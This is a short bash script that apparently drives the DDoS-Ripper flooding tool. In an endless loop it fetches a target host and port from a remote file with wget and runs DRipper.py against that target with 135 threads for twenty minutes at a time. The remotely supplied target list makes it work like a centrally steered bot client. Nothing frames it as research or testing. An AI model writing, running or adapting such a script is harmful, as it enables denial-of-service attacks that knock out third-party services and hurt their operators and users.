#!/bin/bash

cd DDoS-Ripper

while true
do
  content=$(wget $TARGET_FILE -q -O -)
  echo $content

  IFS=':' read -r -a tokens <<< "$content"

  HOST="${tokens[0]}"
  PORT="${tokens[1]}"

  timeout 20m python3 DRipper.py -s ${HOST} -p ${PORT} -t 135
done
